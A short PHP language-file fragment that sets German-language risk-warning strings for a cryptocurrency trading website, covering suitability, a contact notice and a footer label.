$risk_warning_s4_3 = "<strong>Eignung:</strong> Wenn Sie die Risiken nicht vollständig verstehen, auf lebensnotwendige Mittel angewiesen sind oder mit geliehenem Geld handeln, ist der Krypto-Handel nicht für Sie geeignet. Wenden Sie sich im Zweifel an einen unabhängigen, lizenzierten Finanzberater.";

$risk_warning_contact = "<strong>Kontakt:</strong> Bei Fragen zu diesem Hinweis oder um eine Anfrage zu stellen, wenden Sie sich bitte über das Kontaktformular auf unserer Website an unser offizielles Kundensupport-Team.";
$footer_risk_warning = "Risikohinweis";
